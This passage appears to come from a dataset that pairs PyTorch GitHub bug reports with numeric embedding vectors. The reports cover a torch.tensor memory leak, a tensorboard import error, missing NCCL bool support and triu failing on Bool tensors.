 -3.49843085e-01 -1.53442517e-01 -2.56933123e-01  4.65446532e-01
  1.83317497e-01  2.79756069e-01  3.24430883e-01 -2.25593016e-01
 -1.14086151e-01  5.33978716e-02  2.17835724e-01 -2.08211184e-01
 -2.87662148e-01  1.56788528e-01 -1.13939069e-01 -3.38538826e-01
  2.32076757e-02  1.99440330e-01 -9.08879489e-02  2.39131808e-01
  2.06853241e-01 -3.03055078e-01  3.06364857e-02 -3.39676827e-01
 -4.55189534e-02  7.03127682e-03  1.98470265e-01  2.14388855e-02
  1.13181278e-01 -2.83795428e-02 -1.53256491e-01 -3.16601276e-01
 -2.81640768e-01  4.66985643e-01 -1.17047861e-01 -2.69418150e-01
  4.38964441e-02 -3.03024352e-01  4.02900547e-01  1.32858098e-01
 -2.80468911e-02 -2.45429575e-01 -2.31194258e-01  1.34031937e-01
  6.31352484e-01 -2.09179938e-01 -1.53702855e-01 -1.61626786e-01
 -6.79154396e-02  2.55535066e-01 -1.62484437e-01 -1.49291933e-01
 -1.91446140e-01 -9.49704349e-02  5.74604794e-02 -3.52701306e-01
  3.45378578e-01  1.19228177e-01  9.58727673e-04  4.03037250e-01
 -1.56649351e-01  1.13900825e-02  9.74105000e-02 -1.15079105e-01
 -2.67661721e-01  1.03113286e-01  9.35911536e-02 -2.13405609e-01
 -3.36518228e-01 -7.56142288e-03 -1.82607159e-01  1.02894798e-01
 -2.97455601e-02 -4.99798805e-02 -2.71938264e-01  4.33003679e-02
 -1.09971270e-01  1.53588519e-01  2.33739302e-01 -1.70814127e-01
  3.26841831e-01 -5.58035895e-02 -1.11889288e-01  5.70240207e-02
  1.91710263e-01  2.78450429e-01  1.55115604e-01  9.16326791e-02
  1.13512442e-01 -9.72099975e-02 -1.69440374e-01  6.71766549e-02
 -4.27602381e-01 -1.61420271e-01 -8.54768381e-02 -4.05887887e-03
  3.84350508e-01  3.84895414e-01  2.00077251e-01 -4.42220658e-01
  5.49727753e-02 -2.66646445e-01 -3.32093798e-02 -2.40066200e-01
  1.91813093e-02  2.02967793e-01  2.32191496e-02  3.04375529e-01
  1.67905912e-01 -1.63672432e-01  1.25034735e-01 -2.72129744e-01
  3.22662950e-01 -1.22381702e-01  1.57224476e-01 -7.82699417e-03
  1.98781461e-01 -3.20850730e-01 -1.33254766e-01  2.74193853e-01
  3.09887260e-01 -1.53799102e-01  4.25529256e-02  1.79801449e-01
  4.70998764e-01  1.42551914e-01  3.37535083e-01 -1.60379857e-01
  4.40730006e-02  1.03085771e-01  1.23670638e-01  2.35686362e-01
  7.05684125e-02 -3.02596420e-01  3.73791724e-01 -1.68022394e-01
 -2.20982730e-01  4.34196353e-01  4.35731653e-03  3.94819558e-01
  2.86493570e-01  1.62904367e-01  9.56232995e-02  2.11862713e-01
 -2.23745987e-01 -3.39956939e-01 -2.72631586e-01  9.28998142e-02
 -2.65441179e-01 -1.43431658e-02  4.12891619e-02 -1.66531965e-01
 -1.27433352e-02  3.54843400e-02  3.80824972e-03 -8.71820524e-02
  3.13979030e-01 -3.02264281e-03  5.66002838e-02 -2.46961594e-01
 -1.29135892e-01  2.39233226e-01 -2.24664718e-01 -3.06990802e-01
 -1.60104036e-01 -2.50704229e-01  1.11100018e-01 -1.12265930e-01
 -1.63750902e-01 -3.89741153e-01 -1.30059868e-02  2.54510948e-03
 -7.40085095e-02 -9.39892381e-02  1.92622980e-03  2.43517131e-01
  3.27695668e-01  4.25854415e-01  8.28910246e-02  1.04242302e-01
 -2.54919529e-01  2.65609652e-01  3.82861197e-02  1.45074725e-01
  3.33383456e-02  1.32723242e-01 -2.40050375e-01 -2.22652823e-01
 -2.63547674e-02  1.83035769e-02 -9.36279297e-02  3.02082617e-02
 -1.84011474e-01  2.33475715e-01  2.77420819e-01  2.74589956e-01
  3.10020387e-01  2.81252861e-01  4.28175509e-01 -2.26503193e-01
  3.66828032e-02  2.32816301e-02  1.01203248e-01 -1.83222234e-01
 -3.45906496e-01  3.37150484e-01  1.51246652e-01 -7.25735500e-02]"
Memory leak in `torch.tensor` high priority module: internals module: memory usage triaged module: numpy,"## ðŸ› Bug

Calling `torch.tensor` on a Python `list` of `np.float32` objects leaks memory.

## To Reproduce

```
import numpy as np
import torch

def mem():
	import os, psutil
	return psutil.Process(os.getpid()).memory_info().rss // 1024

a = np.zeros(10000, dtype = np.float32) # <-- 1. dtype is important
a = list(a) # <-- 2. has to be a python list

mem_base = mem()
for _ in range(10):
	torch.tensor(a) # <-- 3. must not pass `dtype=torch.float32` here
	print(mem() - mem_base)

# output on my machine:
# 1416
# 2884
# 3940
# 4996
# 6316
# 7372
# 8428
# 9484
# 10804
# 11860
```

## Expected behavior

The number being printed (memory usage) should be more or less constant.

## Environment

 - PyTorch Version: 1.0.0, 1.1.0, 1.2.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.6.8

## Additional context

On pytorch==0.4.1, `torch.tensor(a)` throws:
```
RuntimeError: Could not infer dtype of numpy.float32
```

Also, this might be the underlying bug in [#17499](https://github.com/pytorch/pytorch/issues/17499).

### How this shows up in real code

This shows up in real code if you have a 1d array in a dataset:

```
class Dataset:
    def __init__(self, X, y):
        self.X = x; self.y = y
    
    def __getitem__(self, i):
        return self.X[i], self.y[i] # <-- self.y[i] is a np.float32
    
    def __len__(self):
        return self.X.shape[0]
```

`self.y[i]` is a `np.float32`, and in 1.2.0, a batch of these get wrapped in a `list` by `_MapDatasetFetcher`, and `default_collate` calls `torch.as_tensor` on it.",True,"[-3.63040805e-01 -2.75825977e-01 -2.85293102e-01  3.36522758e-02
  1.00510396e-01 -4.50918734e-01  4.56771255e-02  2.03312486e-01
 -2.59481251e-01 -9.77605432e-02 -6.75132945e-02 -7.92907774e-02
 -2.80737817e-01  3.03562909e-01 -3.00190412e-02 -9.75570530e-02
 -6.11318499e-02 -7.31050819e-02  5.51275648e-02  1.17932223e-01
  3.37409645e-01  3.26009579e-02 -1.89481229e-01  1.06880087e-02
 -3.41477729e-02  4.22906965e-01 -3.33181396e-03 -2.83504695e-01
  2.52573937e-01  8.75017419e-02 -1.14267901e-01 -2.74486184e-01
 -1.91679120e-01  4.36159149e-02  1.64895684e-01  3.10158849e-01
 -3.31265986e-01 -2.07653552e-01 -1.27750799e-01 -4.26187478e-02
  2.34389514e-01  2.04507440e-01  9.31255445e-02  1.42491445e-01
  1.06024660e-01  2.51339078e-01 -2.68133640e-01  1.77889198e-01
 -4.82861102e-02 -9.47146267e-02 -1.84500486e-01  2.92063028e-01
 -3.44385266e-01 -4.81858328e-02 -9.90719721e-02 -2.28508711e-01
  7.92838335e-02  2.20369976e-02  8.99772793e-02 -1.91312209e-01
  5.47153205e-02 -1.81892425e-01 -5.28597832e-03 -1.54441014e-01
  2.62739658e-01 -2.23072946e-01  8.02358761e-02  3.08535099e-01
  4.44129825e-01 -2.38882303e-01  2.36300915e-01  2.63073981e-01
 -2.65431583e-01 -1.41577385e-02 -9.01887268e-02  8.04645643e-02
 -1.02168694e-01  1.35313123e-01 -1.14073932e-01 -2.26992130e-01
 -4.99466322e-02  6.14467673e-02  5.42564392e-02 -1.64678797e-01
  2.21872121e-01  8.74975175e-02  3.37352484e-01  1.19896263e-01
  2.45724842e-01 -2.65425164e-02  3.49992037e-01  1.32786691e-01
 -5.28509095e-02  3.15202475e-01 -5.10677472e-02  1.35916531e-01
  4.44123149e-01  8.33867788e-02 -2.60793388e-01 -3.20115954e-01
  6.40451089e-02 -3.19226772e-01 -1.37912542e-01  2.49926060e-01
  1.55375138e-01 -3.40812430e-02  1.45028546e-01  2.92998433e-01
  1.66097581e-01 -1.23126812e-01  2.61258721e-01  6.67253956e-02
 -1.30202442e-01  7.25287795e-02 -1.70965828e-02 -1.14761405e-02
 -2.41623670e-01  2.62392834e-02 -2.71014184e-01  4.80148941e-01
 -9.61950421e-02  1.87673733e-01 -2.65512392e-02  2.47239783e-01
 -3.20033096e-02  3.18430699e-02 -1.25415921e-01 -1.15336493e-01
 -4.51164320e-04 -5.64675685e-03 -1.07932240e-01  1.11983269e-01
 -6.06665015e-01  1.77771114e-02  4.07730639e-01  4.97948647e-01
 -2.33485639e-01 -6.78808093e-02 -2.24375024e-01 -1.74387634e-01
  2.89035961e-05  1.11295611e-01 -2.29914472e-01 -4.12716359e-01
  2.67143548e-01  6.93890676e-02 -7.94009715e-02  1.60493344e-01
  8.03375393e-02  3.81097078e-01  8.11539739e-02 -1.19209222e-01
 -3.63793433e-01  4.18375701e-01 -2.24265814e-01 -3.19515467e-01
  2.24518850e-01  6.38134778e-02  2.95041263e-01 -4.99066085e-01
  7.03049377e-02  3.89320612e-01  1.55290231e-01  1.59712404e-01
  2.42224708e-01 -3.24757583e-02 -5.29465795e-01 -2.07615271e-01
 -4.27538067e-01  1.22683182e-01 -2.70443678e-01 -1.10779561e-01
 -2.63059705e-01 -6.96987361e-02  2.51194060e-01 -1.87188238e-01
 -1.21993542e-01 -6.41816258e-01 -1.94965810e-01  4.25688699e-02
  9.70000327e-02  3.85920048e-01  8.85039195e-02 -2.48203892e-02
  7.42998123e-02 -1.71947330e-01  2.81957150e-01 -6.75837770e-02
  2.23742962e-01  2.29680184e-02 -2.91591048e-01 -9.03828144e-02
  1.20934948e-01 -1.44102663e-01  1.45637795e-01  2.40291283e-01
 -3.99245284e-02  4.35675383e-02 -2.20755130e-01 -1.12998612e-01
 -2.15757787e-01  5.00999838e-02 -1.04200423e-01  1.31637409e-01
  4.39547837e-01  7.71597680e-03 -3.46609592e-01 -5.28176010e-01
 -1.35607153e-01  9.38951448e-02 -1.96873263e-01 -2.70658076e-01
 -3.18005919e-01  7.64781833e-02  3.56846228e-02  1.24996588e-01
 -1.12582847e-01  1.32265603e-02  7.47023746e-02  4.30236720e-02
  2.26321846e-01 -2.23130703e-01 -6.53173178e-02 -2.14275405e-01
  1.42182916e-01  1.02069251e-01 -3.33735228e-01 -7.26152956e-02
 -6.52306378e-02  6.42487258e-02 -1.18501134e-01 -8.65182430e-02
  1.16641887e-01  2.44545452e-02 -1.62708297e-01  2.92287290e-01
 -6.46356642e-02  5.12874536e-02 -1.70394003e-01  1.73759565e-01
 -2.45824426e-01 -6.97670281e-02  5.31714633e-02 -1.13967381e-01
 -2.07444578e-01  2.39494666e-01  2.09284186e-01 -1.31560400e-01
 -3.61454427e-01  2.88864315e-01 -1.41145855e-01  4.08446416e-04
  1.50965273e-01  3.15483958e-02  4.30992633e-01  6.85515627e-02
 -7.70139843e-02 -2.49288417e-02 -3.66748422e-02 -3.53703469e-01
  1.12919867e-01  3.36692661e-01 -1.43906325e-01  2.83764750e-01
 -2.88961604e-02  1.18190549e-01 -1.68599576e-01  4.78004813e-01
  8.20751637e-02 -1.88617930e-01  9.52697247e-02 -1.93527788e-01
  4.77976501e-01  7.11025000e-02  2.06710979e-01 -5.62897742e-01
  3.86242539e-01 -1.70659915e-01  2.69347727e-02 -1.04269542e-01
  2.55913824e-01  2.69715965e-01 -5.62655702e-02  7.81532377e-02
  3.28889430e-01 -1.66326210e-01 -2.21383601e-01 -2.54436195e-01
 -2.91784167e-01  2.65497826e-02 -1.44166246e-01  2.81972885e-02
  3.07536095e-01  1.91723742e-03 -1.96030885e-01  1.80124223e-01
  2.09493265e-01 -9.92860943e-02 -8.68245661e-02  1.24755554e-01
 -3.35953891e-01  3.12763512e-01  2.38468796e-01 -1.55706450e-01
 -8.72465596e-02 -9.02004391e-02  1.89217195e-01  1.34390831e-01
  4.24747050e-01 -4.39768612e-01  4.04975355e-01 -1.38861001e-01
 -4.51030225e-01 -1.84614405e-01 -1.78765595e-01  3.08494158e-02
 -1.92366913e-02  4.66830254e-01  3.23826969e-01 -1.01375952e-02
 -9.54211652e-02 -1.85957149e-01 -2.32087195e-01  2.11759984e-01
 -3.47344577e-02 -1.29203260e-01 -1.49108917e-01  2.48339251e-01
 -7.97887146e-03  2.00397909e-01 -1.77194238e-01 -2.85631537e-01
  1.48499399e-01 -4.53036241e-02 -1.52544498e-01 -1.13207802e-01
  2.20551491e-02  1.41941711e-01 -4.51938435e-02 -2.59513468e-01
 -7.90482461e-02 -9.60987508e-02  1.90471888e-01 -2.26684898e-01
  6.10793978e-02 -2.82250226e-01  5.54426312e-01  2.60779470e-01
  1.47325560e-01 -3.15453321e-01  6.49985075e-02 -1.59983113e-01
  1.51264265e-01  3.71469110e-01 -1.33508537e-03  3.46761763e-01
  2.36136690e-02  3.46477740e-02  4.78682593e-02  3.65946114e-01
 -1.07863620e-01  2.05411352e-02 -3.13004285e-01 -2.05863826e-02
  4.73270975e-02 -1.53616935e-01  7.10697398e-02 -2.67809272e-01
  7.46181831e-02  3.23148876e-01 -5.58391511e-02  7.27471113e-02
 -1.35660946e-01  6.07686341e-01  6.78022265e-01 -1.36178032e-01
 -1.18039101e-01  3.04636043e-02  9.32797939e-02  5.86001836e-02
  2.62301117e-01  5.88714071e-02 -1.46258488e-01 -1.17067024e-01]"
Error caffe2.python when tried importing SummaryWriter from torch.utils.tensorboard triaged module: tensorboard,"## ðŸ› Bug

I'm currently having a problem whenever I tried importing `SummaryWriter` in my Python script. 

## To Reproduce

I'm currently using the Data Science VM provided by Azure to run the Python. I used clean new env in Anaconda for installing Pytorch and all library dependencies (and also tb-nightly as instructed in [here](https://pytorch.org/docs/stable/tensorboard.html)).

I tried to inspect if my code could use the Tensorboard using simple line of codes like
```
import torch
from torch.utils.tensorboard import SummaryWriter
```
But I got this warning, and then critical message here

![image](https://user-images.githubusercontent.com/12664445/62860613-de750d80-bd2a-11e9-86bf-7c00bfa2add5.png)

## Expected behavior

As far as I know, everything should be good if I followed the instruction correctly. I also tried to reproduce the error in my local Windows PC. But no errors showed up

## Environment
 - PyTorch Version : 1.2.0
 - OS : Linux 16.04
 - How you installed PyTorch : conda
 - Python version: Python 3.6
 - CUDA/cuDNN version : CUDA 10 / cudnn 7.4
 - GPU models and configuration: 2 Tesla K80
 - Any other relevant information: This problem occurs on a VM machine deployed in Azure",True,"[-2.83942372e-01 -4.35840994e-01 -4.33522016e-01  1.25440091e-01
  2.57030576e-01 -1.47348627e-01 -1.47601232e-01  4.68617901e-02
 -3.51036727e-01 -1.14152811e-01 -2.69148946e-01 -1.23263896e-01
 -1.93661720e-01 -2.17257850e-02 -1.96286142e-01  1.16728708e-01
 -1.63256168e-01 -2.02464446e-01  6.34601712e-02 -1.28293931e-01
  1.87556252e-01  3.78070712e-01 -1.37917072e-01  2.15183377e-01
  1.63716212e-01  4.81726155e-02 -4.96031903e-02 -2.46625334e-01
  1.82214469e-01 -7.81787261e-02  1.46080613e-01 -6.90693408e-02
 -2.35693663e-01  8.13522413e-02  1.97343171e-01  1.79915652e-01
 -2.51771748e-01 -2.52281010e-01 -7.62550235e-02 -1.69351161e-01
  1.66625008e-01  2.15244979e-01 -5.46536297e-02  3.47799957e-02
 -1.31142765e-01  2.62019765e-02 -7.84896873e-03 -4.30381671e-02
 -6.84690401e-02  2.12111190e-01 -3.25269401e-01  4.30636629e-02
 -3.22635025e-01 -3.16977262e-01  4.27066013e-02  6.75816387e-02
 -2.09104270e-01  6.07227162e-02  6.26445264e-02 -3.14119995e-01
  1.87763758e-02 -1.31218970e-01  1.01798587e-02  7.51257241e-02
  1.40317619e-01  1.85533836e-01 -7.66496211e-02  2.03984424e-01
  3.89276683e-01 -2.41819605e-01 -2.01253310e-01 -4.49780896e-02
 -3.89659882e-01  1.37131989e-01  5.77498823e-02  1.57618403e-01
 -1.52610123e-01  1.35545358e-01 -5.06606251e-02 -1.45770371e-01
 -2.99557447e-01  2.18311861e-01  2.32498765e-01 -8.84786248e-03
  1.51279822e-01  2.03308053e-02  3.52689773e-01 -4.60447334e-02
  6.40814975e-02  1.29887357e-01  7.07918227e-01 -5.07766381e-02
  2.71965384e-01  3.57268691e-01  3.64413112e-03  2.41142005e-01
  1.85883522e-01  1.81981787e-01  7.49728754e-02 -3.41646671e-01
 -1.48000717e-01 -3.35981011e-01 -4.30712886e-02  2.08089918e-01
 -1.19161336e-02 -1.80754066e-01  1.54725701e-01  6.07022969e-03
  1.43672764e-01 -3.66929531e-01  1.75474972e-01 -2.21990831e-02
  1.95923522e-01 -9.27274115e-03  1.75571263e-01  3.12982082e-01
 -1.61314949e-01  1.19990826e-01 -1.14900880e-01  5.10138869e-01
 -2.05778807e-01  7.24562332e-02  9.87947583e-02  2.58429945e-01
  8.52918625e-03  1.09958261e-01 -1.06845759e-02 -1.64735511e-01
  1.14173673e-01 -2.63438523e-02  1.54327482e-01 -6.08985126e-03
 -1.81729525e-01 -5.04177697e-02  2.18538091e-01  5.29621542e-02
 -3.00086111e-01 -9.83984992e-02  1.11483205e-02  3.30593735e-02
 -9.16748196e-02  1.66048780e-01 -3.75194877e-01 -3.69739115e-01
  2.02473775e-01  4.24768850e-02 -1.71910167e-01  1.95433602e-01
  4.41551879e-02  1.18726850e-01  2.93455608e-02  5.12357205e-02
 -4.47088808e-01  5.33201635e-01 -3.95405367e-02  2.55509198e-01
  3.00091267e-01  8.15754756e-02  9.77653712e-02 -4.47682738e-01
 -2.21399367e-01  4.00056034e-01 -8.77258331e-02 -8.61534253e-02
  4.62641530e-02  5.66201732e-02 -3.94913822e-01  3.71476375e-02
 -2.03348383e-01  1.72300965e-01  5.00413366e-02 -6.98770359e-02
 -6.18158886e-03 -8.36797357e-02  2.80386686e-01  2.93523092e-02
  2.41361201e-01 -5.25466263e-01 -5.27176894e-02  8.24316815e-02
  3.69395792e-01  5.17426610e-01  2.43907392e-01 -8.07968229e-02
 -1.30877942e-01  2.01586694e-01  2.46858984e-01 -1.29795820e-01
  4.18315977e-02  3.63068342e-01 -5.01975790e-03  5.67126647e-02
  2.82189697e-01  7.92853311e-02 -3.22251245e-02  2.79791355e-01
  2.00730354e-01 -3.72328520e-01 -9.37821716e-02 -1.27661079e-01
  2.72461712e-01  1.47926033e-01  1.81650355e-01  4.40353788e-02
 -3.65942866e-02 -3.62255573e-01 -8.19997191e-02 -3.72573614e-01
 -3.89663398e-01  3.12439054e-01 -3.71589065e-02 -3.26539189e-01
 -3.16813365e-02 -5.16040884e-02 -7.35547468e-02  1.87719896e-01
  1.08574525e-01  1.91254914e-01 -1.93749294e-01  1.55752450e-01
  1.23481080e-01 -1.92896962e-01  2.60174554e-02 -1.87476203e-01
  2.21199408e-01 -1.01223931e-01 -3.07612658e-01 -1.05195194e-02
 -2.65420258e-01  1.40785933e-01  2.41766199e-02 -3.13695401e-01
  2.08772153e-01 -1.20562930e-02  1.88697770e-01 -1.34897977e-01
 -3.63373309e-02 -1.96272209e-01 -1.85272783e-01  8.73821527e-02
 -2.46121943e-01  9.56686437e-02 -8.07098150e-02 -2.27149189e-01
 -2.66425014e-01 -1.39478847e-01  9.44371223e-02 -1.54077917e-01
 -2.68516839e-01  1.10492520e-02 -5.94000332e-04 -4.76199836e-02
  6.31825924e-02  1.58101201e-01  2.87840158e-01  2.24749535e-01
 -3.98001038e-02 -2.31301114e-02 -2.18693763e-01 -5.31728417e-02
  3.41576934e-01  1.96663260e-01  5.23285531e-02  6.36279404e-01
  1.36525646e-01  1.32263765e-01 -1.79449201e-01  1.87238857e-01
  6.02041483e-02 -2.47111142e-01 -2.51582384e-01 -2.72254616e-01
  3.61111224e-01 -4.79638726e-02  1.93042710e-01 -1.61151886e-01
  4.13047493e-01 -1.27215207e-01 -1.23422489e-01 -9.80216712e-02
  1.57049179e-01  2.78910875e-01 -5.92250749e-03  7.72174299e-02
  1.02121621e-01 -1.51886106e-01 -5.10796458e-02 -4.07508433e-01
 -1.06908686e-01  7.66772702e-02 -1.20913789e-01  7.72076920e-02
  3.65918607e-01 -2.06594184e-01 -1.89233720e-01 -4.11617905e-02
  2.94624925e-01  1.46560878e-01  7.38804936e-02  3.35650146e-01
 -1.01190001e-01  1.35106653e-01  1.02678426e-01 -1.32048160e-01
 -1.82007894e-01 -8.17192048e-02  1.32622927e-01 -1.02911919e-01
  4.03907776e-01 -4.73043531e-01  3.68585706e-01  6.75095618e-02
 -1.68063432e-01  4.82511282e-01  1.00784618e-02 -4.64209691e-02
  6.04664758e-02  5.67571282e-01  3.33175480e-01 -1.03555527e-02
 -3.19050908e-01 -3.18319559e-01 -3.58265519e-01  6.67909756e-02
  2.33722813e-02  2.40915060e-01 -1.96767449e-01 -7.16121644e-02
 -2.04523742e-01  3.10236719e-02 -2.63680425e-02 -2.31328472e-01
 -1.90924764e-01  2.52681673e-01 -1.84463054e-01 -1.23687267e-01
  9.45946872e-02  2.29123503e-01 -1.05771512e-01 -3.65390241e-01
  8.66149291e-02 -7.66565651e-02  1.54102687e-03 -3.59007359e-01
 -1.19248822e-01 -2.96471834e-01  3.69316787e-01  3.23499978e-01
 -1.62530929e-01 -2.41498351e-01 -1.33446783e-01  4.84535992e-02
 -1.15792230e-01  4.32302505e-02  5.54622747e-02  3.90573084e-01
 -3.30846980e-02 -2.42597759e-02 -3.01158261e-02  3.39565694e-01
 -1.90187469e-01  1.73659161e-01 -4.80305493e-01 -2.30691254e-01
  2.91979969e-01 -1.31324887e-01 -2.19957083e-01  1.72298640e-01
  1.21751361e-01  2.76118875e-01 -2.85218179e-01  2.41871238e-01
  7.79915899e-02  3.24470520e-01  3.48706782e-01 -1.33550214e-02
 -1.46377251e-01  1.69678569e-01 -2.61366814e-02 -4.47696634e-02
 -1.08797289e-02  2.15017632e-01  5.01315296e-02 -5.49943328e-01]"
[distributed] NCCL Backend doesn't support torch.bool data type oncall: distributed triaged enhancement module: boolean tensor,"## ðŸ› Bug

In version 1.2.0, NCCL backend doesn't support `torch.bool` datatype. Broadcasting a tensor of this type throws error ""RuntimeError: Unsupported data type for NCCL process group"".

## To Reproduce

Steps to reproduce the behavior:

Create a file test.py with following contents:
```py
import torch
import argparse
from torch import distributed as dist


parser = argparse.ArgumentParser()
parser.add_argument(""--local_rank"", type=int)

args = parser.parse_args()

torch.distributed.init_process_group(""nccl"")

local_rank = args.local_rank

device = torch.device(local_rank)

if local_rank == 0:
    element = False
else:
    element = True


def broadcast_scalar(scalar, src=0, device=""cpu""):
    scalar_tensor = torch.tensor(scalar).to(device)
    with torch.no_grad():
        scalar_tensor = dist.broadcast(scalar_tensor, src)
    return scalar_tensor.item()


broadcast_scalar(element, src=0, device=device)
```

Run it with following command:
`python -u -m torch.distributed.launch --nproc_per_node 2 test.py`

This has been tested on 2 GPUs.

## Expected behavior

NCCL backend should support the bool datatype. 
Current workaround fix: Change the datatype to int by doing `.long()` before broadcasting.
## Environment

```
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.1 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: version 3.10.2

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 9.0.176
GPU models and configuration:
GPU 0: Quadro GP100
GPU 1: Quadro GP100

Nvidia driver version: 410.79
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] numpy==1.16.3
[pip] torch==1.2.0
[pip] torchtext==0.3.1
[pip] torchvision==0.2.2
[conda] torch                     1.2.0                     <pip>
[conda] torchtext                 0.3.1                     <pip>
[conda] torchvision               0.2.2                     <pip>
```
",True,"[-0.45543617 -0.12867492 -0.19369319 -0.08223653  0.08619735 -0.40165722
 -0.10288292  0.13428591 -0.5248393  -0.05695051 -0.11601007  0.04082429
 -0.19294271  0.2274307   0.03774086  0.17553326 -0.05321228 -0.4346125
  0.06190977 -0.07493463  0.18367022  0.07224439 -0.02824458  0.0469174
 -0.35959196 -0.00523925 -0.3308214  -0.15644085  0.27123737 -0.0072246
 -0.05178589  0.03406124 -0.62704563  0.00245762 -0.10518621 -0.01041266
 -0.26822627 -0.00371983 -0.48403803 -0.07828423  0.10454164  0.08347943
 -0.15835688  0.0233616  -0.21188256 -0.15283401  0.19483593  0.3132408
 -0.13983116 -0.3118692   0.1141087   0.17974007 -0.15699106 -0.08532214
 -0.04739378 -0.21669887 -0.26406926  0.20168647  0.2066217  -0.39525518
  0.19100112  0.10242155 -0.14768596 -0.09717979  0.11417183 -0.09776694
  0.23981556  0.1519402   0.4756108  -0.18904051 -0.15664251 -0.03934772
 -0.27806616  0.28267443  0.07010382  0.14809641 -0.05332988  0.04643116
 -0.24764252 -0.33581662  0.08429408 -0.0632595  -0.0673029  -0.00550797
  0.32603353 -0.10981584  0.13121486 -0.07953119  0.15288699  0.45915323
  0.02705033  0.11112766 -0.00274472  0.17007938 -0.23458359  0.19401225
  0.39958578 -0.12621346  0.11903809 -0.02572929 -0.03697999 -0.5192456
 -0.24051291  0.24895974  0.11407812 -0.12955183  0.19083881  0.309439
  0.16411392 -0.3300593  -0.09800643  0.16754246  0.11476418 -0.42278337
  0.04939315 -0.05270969 -0.521452   -0.07713279  0.03981382  0.05420469
  0.15677544  0.03885544  0.32499263  0.341076    0.65314424  0.05144938
 -0.10966229 -0.02609684  0.01445884  0.08269782  0.19503888  0.07975186
  0.09782451  0.00243354  0.35505635  0.35195443 -0.4131346   0.04010202
  0.00428697 -0.07359143 -0.1997042  -0.06053462  0.15132064 -0.19813474
  0.17133836 -0.02840214 -0.12499052  0.29066455  0.02783251  0.07607148
  0.09211261 -0.1266808  -0.36103892  0.33891094  0.17642233  0.22242853
  0.25404012  0.08991956  0.36619028 -0.31911492  0.11812551  0.24280715
  0.1319114  -0.10908844 -0.14176695 -0.10670817 -0.18463218 -0.128252
 -0.2897995   0.06371725  0.00739489 -0.2838472  -0.18558595 -0.2755101
  0.21556127 -0.05180324 -0.06561536 -0.3890527   0.14353469  0.49424803
  0.2946332   0.24698463  0.38337874  0.31129506 -0.1065067  -0.02260349
  0.23441076 -0.13536757  0.04150193  0.16485006 -0.34371233 -0.2774958
  0.10685804 -0.18421037  0.01415598  0.02265416  0.04824437 -0.27987802
  0.04012783 -0.17916986  0.01373889 -0.03996006  0.08908912  0.07562494
  0.08718379 -0.02404802 -0.07670726 -0.4948507  -0.3728388  -0.05681783
 -0.2316199  -0.42119494  0.03022232 -0.20889103 -0.04023772  0.00489707
  0.0277311  -0.13407767 -0.06992235  0.00681424  0.41268557 -0.16080941
  0.09605667 -0.13071421  0.14629295  0.23981228 -0.3635121  -0.16286682
 -0.02505221 -0.01010359 -0.0760687  -0.21123764  0.3266815   0.06612854
  0.129782    0.22465993 -0.05215111 -0.13923657 -0.28357983  0.0836726
 -0.2835926  -0.14146096  0.05261971 -0.30251193 -0.39276007  0.23234917
 -0.10597288 -0.16145663 -0.37931043 -0.0108318  -0.12804437  0.3647134
  0.15611947  0.1621561   0.38248068  0.23220368  0.00135737 -0.21866536
 -0.08409818 -0.05835903  0.00621524  0.07760195 -0.05278169  0.2049455
  0.18495065  0.01605973 -0.2869305   0.13348772 -0.12971738  0.11863486
 -0.11417469 -0.30637294  0.49476627  0.1324498   0.31355363  0.04235401
  0.5338266   0.06059953  0.1614281   0.03892403  0.25746697  0.5099279
 -0.12226538  0.18092921  0.29926273 -0.19904059 -0.269654   -0.21978503
 -0.07927056 -0.26394284 -0.21745928 -0.06251606  0.30997643 -0.19093971
 -0.16922742  0.01379608  0.01426797 -0.15419883  0.08911657  0.10582801
 -0.04833307 -0.02535261  0.14728443  0.14309025 -0.17352027 -0.15348046
  0.30096242  0.15468459  0.2976876  -0.53794235  0.22962101  0.03090439
 -0.03747121  0.3034014  -0.03226482  0.19126692 -0.11711532  0.48454636
  0.38726884  0.12508357  0.20716265 -0.18048683 -0.2424612   0.01397823
 -0.08399076  0.16747627 -0.23756135 -0.05802419 -0.16157559 -0.15126845
 -0.09177023  0.09088679  0.30335438  0.09854387  0.03497679 -0.13966694
 -0.15688986  0.34877723 -0.15340182 -0.26747733 -0.20161964  0.15861009
  0.01884593  0.16589575 -0.13317043 -0.17933524  0.35908324  0.12982094
 -0.1054383   0.19351801 -0.04175624 -0.12190713 -0.14018115  0.14442533
  0.13413057  0.41870093 -0.15229706 -0.00479485  0.17332512  0.3562636
  0.02495327  0.39990145 -0.29075316 -0.04494849  0.11299483 -0.04480609
 -0.2983098  -0.16023159  0.11333505  0.25279498 -0.20875713  0.1972355
 -0.26308054  0.08451426  0.4288783  -0.17998773 -0.04150303  0.03453716
  0.09860299 -0.08307579 -0.03222401  0.21110621  0.28980848 -0.30561432]"
triu not implemented for Bool high priority triaged module: boolean tensor,"I'm getting the error [title] with the latest nightly build.  I was doing

```python
torch.ones(n, m, dtype=torch.uint8).triu_() 
```
to get an upper-triangular mask, but now I'm getting a deprecation warning about using tensors other than booleans in `torch.masked_scatter`, so I changed the above to

```python
torch.ones(n, m, dtype=torch.bool).triu_()
```
which now fails with `RuntimeError: ""triu"" not implemented for 'Bool'`.  Is this known and/or WIP?",True,"[-0.29053277 -0.12792423 -0.05008941 -0.08597711  0.10379015 -0.39958453
  0.1483814  -0.16993058 -0.4774795  -0.25583476 -0.12227172 -0.29649025
 -0.13411036  0.18351313  0.2888779   0.03423693 -0.29982704 -0.22246665
  0.23694223 -0.26687926  0.18971296 -0.21165879 -0.4910692   0.29507956
 -0.04606789  0.0324707  -0.00356447 -0.19521576  0.36904794  0.02700158
  0.01167845 -0.13257088 -0.52631474 -0.03758137 -0.01623483 -0.02671084
 -0.3577733   0.12046432 -0.13903673  0.07895967  0.04486529  0.05854192
 -0.03302358 -0.17934123 -0.01817443  0.00492479 -0.07734481  0.3569893
 -0.07638685 -0.14997804  0.19738567  0.22647499 -0.17415106  0.07018059
  0.05711172 -0.17540014 -0.11629797  0.15427148  0.04026008 -0.2935623
  0.23804215  0.01413121  0.11966135  0.23558372 -0.01002535  0.16826336
  0.04971735  0.17127559  0.4428576   0.11249021  0.24659634 -0.14091942
 -0.0347366  -0.14984623 -0.01798671  0.21453871 -0.3468527   0.05857623
